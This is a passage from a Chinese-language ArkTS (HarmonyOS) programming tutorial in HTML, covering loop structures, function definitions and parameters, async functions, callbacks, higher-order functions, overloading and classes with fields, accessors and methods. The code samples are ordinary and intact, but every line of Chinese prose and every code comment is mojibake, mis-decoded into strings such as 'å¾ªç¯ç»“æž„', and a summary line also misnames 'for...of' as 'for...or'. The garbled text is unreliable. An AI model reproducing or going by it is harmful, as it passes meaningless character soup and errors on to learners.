    //å¦‚æœpeople æ˜¯ workerï¼Œåˆ™æ‰§è¡Œè¿™é‡Œé¢è¯­å¥
    break
  default :
    //å¦‚æœéƒ½ä¸æ»¡è¶³ä»¥ä¸Šé€‰é¡¹ï¼Œåˆ™æ‰§è¡Œè¿™é‡Œé¢è¯­å¥
    break
}
</code></pre>
<h4 data-id="heading-35">2.5.3 å¾ªç¯ç»“æ„</h4>
<p>åœ¨ ArkTS ä¸­ï¼Œå¾ªç¯ç»“æ„çš„è¯­æ³•å’Œ TypeScript/JavaScript åŸºæœ¬ä¸€è‡´ï¼Œæ”¯æŒå¸¸ è§çš„å¾ªç¯ç»“æ„å¦‚ for å¾ªç¯ã€ while å¾ªç¯å’Œ do-while å¾ªç¯ã€‚ä¸‹é¢æ˜¯å¯¹ ArkTS ä¸­å„ç§å¾ªç¯ç»“æ„çš„è¯¦ç»†ä»‹ç»ã€‚</p>
<h5 data-id="heading-36">2.5.3.1 forå¾ªç¯</h5>
<p>for å¾ªç¯æ˜¯æœ€å¸¸è§çš„å¾ªç¯ç»“æ„ï¼Œé€‚ç”¨äºå·²çŸ¥å¾ªç¯æ¬¡æ•°æˆ–éœ€è¦é€šè¿‡è®¡æ•°å™¨æ§ åˆ¶çš„æƒ…å†µ</p>
<p><strong>è¯­æ³•</strong></p>
<pre><code class="hljs language-scss" lang="scss">for (initialization; condition; increment) { 

<span class="hljs-comment">// å¾ªç¯ä½“ </span>

}

</code></pre>
<p>ç¤ºä¾‹</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">// ä» 0 åˆ° 4 æ‰“å°æ•°å­—
for (let i = 0; i &lt; 5; i++) {
  console.log(i.toString());
}
</code></pre>
<ul>
<li><code>initialization</code>ï¼Œä¹Ÿå°±æ˜¯ç¤ºä¾‹ä¸­<code>let i = 0</code>ï¼šåˆå§‹åŒ–è¡¨è¾¾å¼ï¼Œé€šå¸¸ç”¨äºå®šä¹‰å’Œåˆå§‹åŒ–è®¡æ•°å™¨</li>
<li><code>condition</code>ï¼Œä¹Ÿå°±æ˜¯ç¤ºä¾‹ä¸­<code> i &lt; 5</code>ï¼šå¾ªç¯çš„æ¡ä»¶è¡¨è¾¾å¼ï¼Œåªæœ‰å½“æ¡ä»¶ä¸º ç»­æ‰§è¡Œã€‚ true æ—¶ï¼Œå¾ªç¯æ‰ä¼šç»§ç»­æ‰§è¡Œ</li>
<li><code>increment</code>ï¼Œä¹Ÿå°±æ˜¯ç¤ºä¾‹ä¸­<code>i++</code>ï¼šæ¯æ¬¡å¾ªç¯ç»“æŸæ—¶æ‰§è¡Œçš„å¢é‡è¡¨è¾¾å¼ï¼Œé€šå¸¸ç”¨äºæ›´æ–°è®¡æ•°å™¨ã€‚</li>
</ul>
<h5 data-id="heading-37">2.5.3.2 for...ofå¾ªç¯</h5>
<ul>
<li><code>for...of</code> å¾ªç¯ç”¨äºéå†å¯è¿­ä»£å¯¹è±¡ï¼ˆå¦‚æ•°ç»„ã€å­—ç¬¦ä¸²ã€Mapã€Set ç­‰ï¼‰çš„ å€¼ã€‚å®ƒä¸ä¼šè¿”å›ç´¢å¼•æˆ–é”®ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›é›†åˆä¸­çš„å…ƒç´ ã€‚</li>
</ul>
<p>ç¤ºä¾‹</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let numbers=[10,202,30]
for (let index of numbers){
  console.log(index.toString())
}
</code></pre>
<h5 data-id="heading-38">2.5.3.3 whileå¾ªç¯</h5>
<ul>
<li><code>while</code> å¾ªç¯ç”¨äºåœ¨ç»™å®šæ¡ä»¶ä¸º <code>true</code>çš„æƒ…å†µä¸‹é‡å¤æ‰§è¡Œå¾ªç¯ä½“ã€‚æ¡ä»¶è¡¨è¾¾å¼åœ¨æ¯æ¬¡è¿­ä»£å‰éƒ½ä¼šæ£€æŸ¥</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let count = 0;
while (count &lt; 5) {
  console.log(count.toString());
  count++;  // æ›´æ–°è®¡æ•°å™¨
}
</code></pre>
<h5 data-id="heading-39">2.5.3.4 do...whileå¾ªç¯</h5>
<ul>
<li><code>do...while</code>å¾ªç¯ä¸<code>while</code>å¾ªç¯ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äº  <code>do...while</code>å¾ªç¯ä¼š<strong>è‡³å°‘æ‰§è¡Œä¸€æ¬¡ï¼ˆå³ä½¿ä¸æ»¡è¶³æ¡ä»¶ï¼‰</strong>ï¼Œå› ä¸ºæ¡ä»¶æ˜¯å¾ªç¯ä½“æ‰§è¡Œåå†åˆ¤æ–­çš„ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let count = 0;
do {
  console.log(count.toString());
  count++;  // æ›´æ–°è®¡æ•°å™¨
} while (count &lt; 5);
</code></pre>
<p><strong>æ³¨æ„</strong>ï¼šå½“æˆ‘ä»¬ä½¿ç”¨å¾ªç¯æ—¶ï¼Œä¸€å®šè¦æœ‰åˆé€‚çš„å¥‘æœºç»“æŸå¾ªç¯ï¼Œå¦åˆ™å°±ä¼šé€ æˆæ­»å¾ªç¯ï¼Œè¦ä¹ˆå¾ªç¯æ¡ä»¶ä¸ºfalseï¼Œè¦ä¹ˆä½¿ç”¨breakè¯­å¥</p>
<h5 data-id="heading-40">2.5.3.5  breakè¯­å¥</h5>
<p><code>break</code>è¯­å¥ç”¨äºç«‹å³é€€å‡ºå¾ªç¯ã€‚å½“æ»¡è¶³æŸä¸ªæ¡ä»¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>break</code>æå‰ç»ˆæ­¢å¾ªç¯</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let count = 0;
do {
  if (count==5) {
    break
  }
  console.log(count.toString());
  count++;  // æ›´æ–°è®¡æ•°å™¨
} while (count &lt; 10);
</code></pre>
<h5 data-id="heading-41">2.5.3.6 continueè¯­å¥</h5>
<p><code>continue</code> è¯­å¥ç”¨äºè·³è¿‡å½“å‰å¾ªç¯çš„å‰©ä½™éƒ¨åˆ†ï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯çš„åˆ¤æ–­æ¡ä»¶éƒ¨åˆ†ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">let count = 0;
do {
  count++;  // æ›´æ–°è®¡æ•°å™¨
  if (count===6) {
    continue
  }
  console.log(count.toString());
} while (count &lt; 10);

</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ å½“<code>count</code>ç­‰äº6æ—¶ï¼Œ<code>continue</code>è¯­å¥ä¼šè·³è¿‡<code>console.log(count.toString());</code>è¯­å¥åŠä¹‹åçš„æ‰§è¡Œï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚</p>
<h5 data-id="heading-42">2.5.3.7 å¾ªç¯ç»“æ„æ€»ç»“</h5>
<p>åœ¨<strong>ArkTS</strong>ä¸­ï¼Œå¸¸è§çš„å¾ªç¯ç»“æ„åŒ…æ‹¬ï¼š</p>
<ol>
<li><code>for</code>å¾ªç¯ï¼šç”¨äºå·²çŸ¥æ¬¡æ•°çš„å¾ªç¯</li>
<li><code>for...or</code>å¾ªç¯ï¼šç”¨äºéå†å¯è¿­ä»£å¯¹è±¡çš„å…ƒç´ </li>
<li><code>while</code>å¾ªç¯ï¼šæ ¹æ®æ¡ä»¶é‡å¤æ‰§è¡Œå¾ªç¯ä½“</li>
<li><code>do...while</code>å¾ªç¯ï¼šè‡³å°‘æ‰§è¡Œä¸€æ¬¡å¾ªç¯ï¼Œä¹‹åæ ¹æ®æ¡ä»¶åˆ¤æ–­æ˜¯å¦ç»§ç»­</li>
<li><code>break</code>è¯­å¥ï¼šæå‰é€€å‡ºå¾ªç¯</li>
<li><code>continue</code>è¯­å¥ï¼šè·³è¿‡å½“å‰å¾ªç¯å‰©ä½™éƒ¨åˆ†ï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯</li>
</ol>
<p>è¿™äº›å¾ªç¯ç»“æ„éƒ½å¯ä»¥å¸®åŠ©ä½ åœ¨ ArkTS ä¸­å¤„ç†å„ç§éœ€è¦é‡å¤æ‰§è¡Œçš„ä»»åŠ¡ï¼Œæ ¹ æ®å…·ä½“éœ€æ±‚é€‰æ‹©é€‚åˆçš„å¾ªç¯ç±»å‹ã€‚</p>
<h3 data-id="heading-43">2.6 å‡½æ•°</h3>
<p>åœ¨ <strong>ArkTS</strong>  ä¸­ï¼Œå‡½æ•°çš„å®šä¹‰å’Œä½¿ç”¨ä¸ TypeScript å¤§ä½“ç›¸åŒï¼Œä½†ç”±äºå®ƒæ˜¯ä¸“é—¨ä¸ºé¸¿è’™ç³»ç»Ÿï¼ˆHarmonyOSï¼‰è®¾è®¡çš„ï¼Œå¯èƒ½ä¼šæœ‰ä¸€äº›ç‰¹æœ‰çš„æ‰©å±•ã€‚ä¸‹é¢æˆ‘å°†å±•ç¤ºä¸€äº›å¸¸è§çš„ ArkTS å‡½æ•°ä½¿ç”¨æ–¹æ³•ï¼Œå¸®åŠ©ä½ æ›´å¥½åœ°ç†è§£å¦‚ä½•åœ¨ ArkTS ä¸­åˆ›å»ºå’Œä½¿ç”¨å‡½æ•°ã€‚</p>
<h4 data-id="heading-44">2.6.1 å‡½æ•°çš„å®šä¹‰</h4>
<p>åœ¨ <strong>ArkTS</strong> ä¸­ï¼Œå®šä¹‰å‡½æ•°çš„è¯­æ³•ä¸ TypeScript ç±»ä¼¼ï¼Œå¯ä»¥é€šè¿‡<code>function</code>å…³é”®å­—å®šä¹‰æ™®é€šå‡½æ•°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç®­å¤´å‡½æ•°ã€‚</p>
<h5 data-id="heading-45">2.6.1.1 æ™®é€šå‡½æ•°å®šä¹‰</h5>
<pre><code class="hljs language-ArkTS" lang="ArkTS">function greet1(name:string):string{
  return `Hello,${name}!`
}

console.log(greet1("ArkTS"))
</code></pre>
<ul>
<li>å‡½æ•°å£°æ˜å¼•å…¥ä¸€ä¸ªå‡½æ•°ï¼ŒåŒ…å«å…¶åç§°ã€å‚æ•°åˆ—è¡¨ã€è¿”å›ç±»å‹å’Œå‡½æ•°ä½“</li>
<li>å‚æ•°ç±»å‹æ ‡æ³¨ï¼š<code>name:string</code> æ˜¾å¼å£°æ˜å‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²ç±»å‹</li>
<li>è¿”å›å€¼ç±»å‹ï¼š<code>string</code>æŒ‡å®šå‡½æ•°è¿”å›å€¼ä¸ºå­—ç¬¦ä¸²ç±»å‹</li>
</ul>
<h5 data-id="heading-46">2.6.1.2 ç®­å¤´å‡½æ•°å®šä¹‰ï¼ˆLambdaå‡½æ•°ï¼‰</h5>
<pre><code class="hljs language-ArkTS" lang="ArkTS">const greet2 = (name: string): string =&gt; {
  return `Hello,${name}!`
}

console.log(greet2("hqk"))



let sum=(x:number,y:number):number=&gt;{
  return x+y
}
let sum1=(x:number,y:number)=&gt;{
  return x+y
}
let sum2=(x:number,y:number)=&gt;x+y

console.log("sum="+sum(1,2))     //è¾“å‡º3
console.log("sum1="+sum1(1,2))   //è¾“å‡º3
console.log("sum2="+sum2(1,2))   //è¾“å‡º3

</code></pre>
<p>æ³¨æ„çœ‹sum/sum1/sum2 å‡½æ•°å®šä¹‰æœ‰ç»†å¾®å·®åˆ«</p>
<ul>
<li>ç®­å¤´å‡½æ•°åœ¨æ²¡æœ‰æŒ‡å®šè¿”å›ç±»å‹æ—¶ï¼Œä¼šæ ¹æ®è¿”å›çš„è¡¨è¾¾å¼è‡ªåŠ¨æ¨æ–­ç±»å‹</li>
<li>å¸¦å‡½æ•°ä½“ <code>{}</code> çš„ç®­å¤´å‡½æ•°ï¼ˆéœ€è¦å†™ æ˜¾å¼ returnï¼‰</li>
<li>åªæœ‰è¡¨è¾¾å¼çš„ç®­å¤´å‡½æ•°ï¼ˆä¸éœ€è¦å†™ éšå¼ returnï¼‰</li>
</ul>
<p>å› æ­¤ sum/sum1/sum2è¾“å‡ºéƒ½ä¸º3</p>
<p>é‚£ä¹ˆç°åœ¨æ¥ä¸ªå®æˆ˜</p>
<p><strong>æŒ‰é’®ç‚¹å‡»äº‹ä»¶</strong></p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">Button('').onClick(()=&gt;{})
</code></pre>
<p>è¿™é‡Œé¢å°±ç”¨åˆ°äº†Lambdaå‡½æ•°ï¼Œç›¸ä¿¡çœ‹äº†sum/sum1/sum2 å‡½æ•°å®šä¹‰å·®åˆ«ï¼Œä½ èƒ½çœ‹æ‡‚è¿™ä¸ªæŒ‰é’®ç‚¹å‡»äº‹ä»¶æ¡ˆä¾‹</p>
<h4 data-id="heading-47">2.6.2 å‡½æ•°çš„å‚æ•°å’Œè¿”å›ç±»å‹</h4>
<ul>
<li>å’Œ TypeScript ä¸€æ ·ï¼Œåœ¨ <code>ArkTS</code> ä¸­ä½ å¯ä»¥æŒ‡å®šå‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼ç±»å‹ï¼Œç¡®ä¿ç±»å‹çš„å®‰å…¨</li>
</ul>
<h5 data-id="heading-48">2.6.2.1 å¸¦å‚æ•°ç±»å‹å’Œè¿”å›ç±»å‹çš„å‡½æ•°</h5>
<pre><code class="hljs language-ArkTS" lang="ArkTS">function addNumber(a:number,b:number):string{
  return (a+b).toString()
}

console.log(`add=${addNumber(1,2)}`)

</code></pre>
<h5 data-id="heading-49">2.6.2.2 å¯é€‰å‚æ•°</h5>
<pre><code class="hljs language-ArkTS" lang="ArkTS">function greet1(name: string,age?:number): string {
  if (age) {
    return `Hello,${name}! You are ${age} years old.`
  }

  return `Hello,${name}!`
}


console.log(`greet1-&gt;${greet1("Bob")}`) //greet1-&gt;Hello,Bob!

console.log(`greet1-&gt;${greet1("Alice",24)}`)//greet1-&gt;Hello,Alice! You are 24 years old.

</code></pre>
<h5 data-id="heading-50">2.6.2.3 é»˜è®¤å‚æ•°</h5>
<pre><code class="hljs language-ArkTS" lang="ArkTS">function greet1(name: string,age:number=18): string {
  return `Hello,${name}! You are ${age} years old.`
}

console.log(`greet1-&gt;${greet1("Bob")}`) //greet1-&gt;Hello,Bob! You are 18 years old.

console.log(`greet1-&gt;${greet1("Alice",24)}`)//greet1-&gt;Hello,Alice! You are 24 years old.
</code></pre>
<h5 data-id="heading-51">2.6.2.4 å¯å˜å‚æ•°ï¼ˆRestå‚æ•°ï¼‰</h5>
<ul>
<li><strong>å‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯restå‚æ•°</strong>ã€‚ä½¿ç”¨restå‚æ•°æ—¶ï¼Œå…è®¸å‡½æ•°æˆ–æ–¹æ³•æ¥å—ä»»æ„æ•°é‡çš„å®å‚</li>
</ul>
<pre><code class="hljs language-ArkTS" lang="ArkTS">function sumNumber(...numbers: number[]): number {
  let res = 0
  for (let item of numbers) {
    res += item
  }
  return res
}


console.log(`sum1-&gt;${sumNumber()}`) //sum1-&gt;0
console.log(`sum2-&gt;${sumNumber(1, 2, 3, 4, 5, 6, 7)}`) //sum2-&gt;28

</code></pre>
<h4 data-id="heading-52">2.6.3 å¼‚æ­¥å‡½æ•°ï¼ˆAsync/Awaitï¼‰</h4>
<ul>
<li><code>ArkTS</code> æ”¯æŒå¼‚æ­¥ç¼–ç¨‹ï¼Œå¯ä»¥é€šè¿‡ <code>async</code> å’Œ <code>await</code> æ¥å¤„ç†å¼‚æ­¥æ“ä½œ</li>
</ul>
<h5 data-id="heading-53">2.6.3.1 å¼‚æ­¥å‡½æ•°å®šä¹‰å’Œè°ƒç”¨</h5>
<pre><code class="hljs language-ArkTS" lang="ArkTS">
import fs from '@ohos.file.fs'; //è¿™é‡Œå¼•å…¥ç³»ç»Ÿç»„ä»¶å¹¶å‘½åä¸ºï¼šfs

/**
 * æ‰“å¼€æ–‡ä»¶:fs:ç³»ç»Ÿæä¾›çš„ç”¨äºæ‰“å¼€æ–‡ä»¶çš„ä¸€ä¸ªç»„ä»¶
 * å¼‚æ­¥æ–¹æ³•
 */
async function openFile(fileName: string) {
  let file = await fs.open(fileName, fs.OpenMode.READ_WRITE | fs.OpenMode.CREATE)
  return file
}

function getData() {
  openFile("userInfo.txt").then((data: fs.File) =&gt; {
    console.log(data.name)
  })
}
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­:</p>
<ul>
<li><code>openFile</code>æ˜¯ä¸€ä¸ªå¼‚æ­¥å‡½æ•°ï¼ˆ<code>async</code>ï¼‰ï¼Œä½¿ç”¨<code>await</code>ç­‰å¾…æ–‡ä»¶æ‰“å¼€å®Œæˆå¹¶è¿”å›ç»“æœ</li>
<li><code>openFile</code>æˆ‘è¿™æ•…æ„æ²¡æœ‰å†™è¿”å›å€¼ï¼Œä½†å´æœ‰ <code>return file</code>,è¿™é‡Œå’Œä¸Šé¢<code>sum/sum1/sum2</code>ä¾‹å­ä¸€æ ·ï¼Œå®ƒä¼šæ ¹æ®æ–¹æ³•ä½“è‡ªåŠ¨æ¨æ–­æ–¹æ³•è¿”å›ç±»å‹ä¸ºï¼š<code>Promise&lt;fs.File&gt;</code></li>
</ul>
<h4 data-id="heading-54">2.6.4 å›è°ƒå‡½æ•°</h4>
<ul>
<li>ä½ ä¹Ÿå¯ä»¥åœ¨ ArkTS ä¸­<strong>ä¼ é€’å›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°</strong>ï¼Œå°¤å…¶åœ¨ UI äº¤äº’ä¸­æ¯”è¾ƒå¸¸è§</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">function performAction(actionNumber: (a: number, b: number) =&gt; number) {
  console.log("Action started.")
  console.log(`Action run-&gt;${actionNumber(10, 20)}`)
  console.log("Action completed.")
}


performAction((a, b) =&gt; {
  console.log("Action æ‰§è¡Œa*bé€»è¾‘");
  return a * b;
});



performAction((a, b) =&gt; {
  console.log("Action æ‰§è¡Œa+bé€»è¾‘");
  return a + b;
});

</code></pre>
<p>è¾“å‡ºå†…å®¹ï¼š</p>
<pre><code class="hljs language-css" lang="css">   Action started.
   Action æ‰§è¡Œ<span class="hljs-selector-tag">a</span>*<span class="hljs-selector-tag">b</span>é€»è¾‘
   Action run-&gt;<span class="hljs-number">200</span>
   Action completed.
   Action started.
   Action æ‰§è¡Œ<span class="hljs-selector-tag">a</span>+<span class="hljs-selector-tag">b</span>é€»è¾‘
   Action run-&gt;<span class="hljs-number">30</span>
   Action completed.
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>åœ¨ <code>performAction</code>æ–¹æ³•é‡Œï¼Œ<code>actionNumber</code>å‚æ•°ä½œä¸ºæœªå®ç°çš„å‡½æ•°/å›è°ƒå‡½æ•°ï¼Œï¼ˆåªç¡®å®šäº†å‚æ•°å’Œè¿”å›ç±»å‹ï¼‰</li>
<li>è€Œåœ¨è°ƒç”¨ <code>performAction</code>æ–¹æ³•çš„æ—¶å€™ï¼Œéœ€è¦å®ç°<code>actionNumber</code>æ–¹æ³•çš„å†…å®¹</li>
</ul>
<h4 data-id="heading-55">2.6.5 é«˜é˜¶å‡½æ•°</h4>
<ul>
<li>é«˜é˜¶å‡½æ•°æ˜¯æŒ‡<strong>æ¥å—ä¸€ä¸ªæˆ–å¤šä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œæˆ–è€…è¿”å›ä¸€ä¸ªå‡½æ•°çš„å‡½æ•°</strong>ã€‚ ArkTS æ”¯æŒé«˜é˜¶å‡½æ•°</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">// é«˜é˜¶å‡½æ•°ï¼šæ¥æ”¶ä¸¤ä¸ªå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªæ–°å‡½æ•°
function combineActions(
  action1: (x: number) =&gt; number,
  action2: (y: number) =&gt; number
) {
  // è¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°
  return (value: number): number =&gt; {
    console.log("æ‰§è¡Œ action1...");
    const r1 = action1(value);

    console.log("æ‰§è¡Œ action2...");
    const r2 = action2(r1);

    return r2;
  };
}

// å®šä¹‰ä¸¤ä¸ªæ™®é€šç®­å¤´å‡½æ•°
let add10 = (num: number) =&gt; num + 10;
let multiply2 = (num: number) =&gt; num * 2;

// è°ƒç”¨é«˜é˜¶å‡½æ•°ï¼Œå¾—åˆ°ä¸€ä¸ªâ€œç»„åˆå‡½æ•°â€
let combined = combineActions(add10, multiply2);

// ä½¿ç”¨è¿”å›çš„å‡½æ•°
console.log("æœ€ç»ˆç»“æœï¼š" + combined(5));
</code></pre>
<p>è¾“å‡ºå†…å®¹</p>
<pre><code class="hljs language-erlang" lang="erlang">æ‰§è¡Œ action1...
æ‰§è¡Œ action2...
æœ€ç»ˆç»“æœï¼š<span class="hljs-number">30</span>
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­</p>
<ul>
<li>é«˜é˜¶å‡½æ•°èƒ½æŠŠâ€œè¡Œä¸ºâ€å½“æˆå‚æ•°ä¼ é€’ï¼Œä½¿é€»è¾‘æ›´çµæ´»ã€æ›´å¤ç”¨ã€æ›´æ˜“æ‰©å±•ã€‚</li>
</ul>
<h4 data-id="heading-56">2.6.6 å‡½æ•°é‡è½½</h4>
<p>ä¸ TypeScript ç›¸åŒï¼Œ<code>ArkTS</code> ä¹Ÿæ”¯æŒå‡½æ•°é‡è½½ã€‚ä½ å¯ä»¥å®šä¹‰å¤šä¸ªå…·æœ‰ä¸åŒå‚ æ•°åˆ—è¡¨çš„å‡½æ•°ï¼Œä½†æ˜¯è¦æ³¨æ„ï¼Œ<strong>é‡è½½å¿…é¡»æ ¹æ®å‚æ•°ç±»å‹æˆ–æ•°é‡æ¥åŒºåˆ†</strong></p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">//å‡½æ•°é‡è½½
function greet(name: string): string;
function greet(name: string, age: number): string;
function greet(name: string, age?: number): string {
  if (age !== undefined) {
    return `Hello, ${name}! You are ${age} yearsold.`;
  } else {
    return `Hello, ${name}!`;
  }
}
console.log(greet('Ali')) //Hello, Ali!
console.log(greet('Bob',20))//Hello, Bob! You are 20 yearsold.
console.log(greet('hqk', 30))//Hello, hqk! You are 30 yearsold.
</code></pre>
<h3 data-id="heading-57">2.7 ç±»ä¸å¯¹è±¡</h3>
<h4 data-id="heading-58">2.7.1 ç±»å£°æ˜</h4>
<p>ç±»å£°æ˜å¼•å…¥ä¸€ä¸ªæ–°ç±»å‹ï¼Œå¹¶å®šä¹‰å…¶å­—æ®µã€æ–¹æ³•å’Œæ„é€ å‡½æ•°</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">export class Person {
  name: string = ''
  surName: string = ''

  constructor(name: string, surName: string) {
    this.name = name
    this.surName = surName
  }

  fullName(): string {
    return `${this.name} ${this.surName}`
  }
}

</code></pre>
<p>å®šä¹‰ç±»åï¼Œå¯ä»¥ä½¿ç”¨å…³é”®å­—newåˆ›å»ºå®ä¾‹</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">import { Person} from '../utils/code'
let p=new Person('John','Smith')
console.log(p.fullName()) //John Smith
</code></pre>
<h4 data-id="heading-59">2.7.2 å­—æ®µ</h4>
<p>å­—æ®µæ˜¯ç›´æ¥åœ¨ç±»ä¸­å£°æ˜çš„æŸç§ç±»å‹çš„å˜é‡ã€‚ ç±»å¯ä»¥å…·æœ‰å®ä¾‹å­—æ®µæˆ–è€…é™æ€å­—æ®µã€‚</p>
<h5 data-id="heading-60">2.7.2.1 å®ä¾‹å­—æ®µ</h5>
<p>å®ä¾‹å­—æ®µå­˜åœ¨äºç±»çš„æ¯ä¸ªå®ä¾‹ä¸Šã€‚æ¯ä¸ªå®ä¾‹éƒ½æœ‰è‡ªå·±çš„å®ä¾‹å­—æ®µé›†åˆã€‚ è¦è®¿é—®å®ä¾‹å­—æ®µï¼Œéœ€è¦ä½¿ç”¨ç±»çš„å®ä¾‹</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class Person1 {
  name: string = ''
  age:number=0

  constructor(name: string, age: number) {
    this.name = name
    this.age = age
  }

  public getName(): string {
    return this.name
  }
}


let p1 = new Person1("Alice", 25)
p1.name

let p2 = new Person1("Bob", 28)
p2.name
</code></pre>
<h5 data-id="heading-61">2.7.2.2 é™æ€å­—æ®µ</h5>
<p>ä½¿ç”¨å…³é”®å­—<code>static</code>å°†å­—æ®µå£°æ˜ä¸ºé™æ€ã€‚é™æ€å­—æ®µå±äºç±»æœ¬èº«ï¼Œç±»çš„æ‰€æœ‰å®ä¾‹å…±äº«ä¸€ä¸ªé™æ€å­—æ®µ</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class Person1 {
  name: string = ''
  age:number=0

  static numberOfPersons = 0

  constructor(name: string, age: number) {
    this.name = name
    this.age = age
    Person1.numberOfPersons++
  }

  public getName(): string {
    return this.name
  }
}

let p1 = new Person1("Alice", 25)

let p2 = new Person1("Bob", 28)

console.log(`number-&gt;${Person1.numberOfPersons}`)

</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>è¦è®¿é—®é™æ€å­—æ®µï¼Œéœ€è¦ä½¿ç”¨ç±»å</li>
</ul>
<h5 data-id="heading-62">2.7.2.3 å­—æ®µåˆå§‹åŒ–</h5>
<p><code>ArkTS</code>è¦æ±‚æ‰€æœ‰å­—æ®µåœ¨<strong>å£°æ˜æ—¶æˆ–è€…æ„é€ å‡½æ•°ä¸­æ˜¾å¼åˆå§‹åŒ–</strong>ã€‚è¿™å’Œæ ‡å‡†TSä¸­çš„ strictPropertyInitializationæ¨¡å¼ä¸€æ ·ã€‚</p>
<p>ä»¥ä¸‹ç¤ºä¾‹æ˜¯åœ¨<code>ArkTS</code>ä¸­ä¸åˆæ³•çš„ä»£ç </p>
<pre><code class="hljs language-ArkTS" lang="ArkTS"> class Person2{
  name:string  

  setName(name:string):void{
    this.name=name
  }

  getName():string{
    return this.name
  }
}
</code></pre>
<p>å¦‚æœä½ è¿™æ ·å†™ï¼Œç¼–è¯‘å™¨ç›´æ¥æç¤ºï¼š<code>Property 'name' has no initializer and is not definitely assigned in the constructor. &lt;ArkTSCheck&gt;</code> ï¼Œ<strong>è¦ä¹ˆå®šä¹‰æ—¶èµ‹å€¼ï¼Œè¦ä¹ˆæ„é€ å™¨æ–¹æ³•èµ‹å€¼</strong></p>
<h5 data-id="heading-63">2.7.2.4 getterå’Œsetter</h5>
<p>setterå’Œgetterå¯ç”¨äºæä¾›å¯¹å¯¹è±¡å±æ€§çš„å—æ§è®¿é—®</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class Person2{
  name:string=''
  private _age: number = 0

  public set age(value: number) {
    if (value&lt;0) {
      throw Error('Invalid age argument')
    }
    this._age = value
  }

  public get age(): number {
    return this._age
  }

}


let p=new Person2()
console.log(`age=${p.age}`) //age=0 
p.age=-10 // è®¾ç½®æ— æ•ˆageå€¼ä¼šæŠ›å‡ºé”™è¯¯

</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li>åœ¨ç±»ä¸­å¯ä»¥å®šä¹‰getteræˆ–è€…setter</li>
<li>setterç”¨äºç¦æ­¢å°†ageå±æ€§è®¾ç½®ä¸ºæ— æ•ˆå€¼</li>
</ul>
<h4 data-id="heading-64">2.7.3 æ–¹æ³•</h4>
<p>æ–¹æ³•å±äºç±»ã€‚ç±»å¯ä»¥å®šä¹‰å®ä¾‹æ–¹æ³•æˆ–è€…é™æ€æ–¹æ³•ã€‚é™æ€æ–¹æ³•å±äºç±»æœ¬èº«ï¼Œåªèƒ½è®¿é—®é™æ€å­—æ®µã€‚è€Œå®ä¾‹æ–¹æ³•æ—¢å¯ä»¥è®¿é—®é™æ€å­—æ®µï¼Œä¹Ÿå¯ä»¥è®¿é—®å®ä¾‹å­—æ®µï¼Œ åŒ…æ‹¬ç±»çš„ç§æœ‰å­—æ®µã€‚</p>
<h5 data-id="heading-65">2.7.3.1 å®ä¾‹æ–¹æ³•</h5>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class RectangleSize{
  private height:number=0
  private width:number=0

  constructor(height: number, width: number) {
    this.height = height
    this.width = width
  }

  calculateArea():number{
    return this.height*this.width
  }
}


let square=new RectangleSize(10,10)
console.log(`square=&gt;${square.calculateArea()}`) //è¾“å‡º square=&gt;100

</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p>
<ul>
<li><code>calculateArea</code>æ–¹æ³•é€šè¿‡å°†é«˜åº¦ä¹˜ä»¥å®½åº¦æ¥è®¡ç®—çŸ©å½¢çš„é¢ç§¯</li>
<li>å¿…é¡»é€šè¿‡ç±»çš„å®ä¾‹è°ƒç”¨å®ä¾‹æ–¹æ³•</li>
</ul>
<h5 data-id="heading-66">2.7.3.2 é™æ€æ–¹æ³•</h5>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ArkTS" lang="ArkTS">class C1{
  aa:string=''
  
  static a:number=10
  
  static staticMethod():string{
    return `this is a static method. ${C1.a}`
  }
}

console.log(C1.staticMethod())
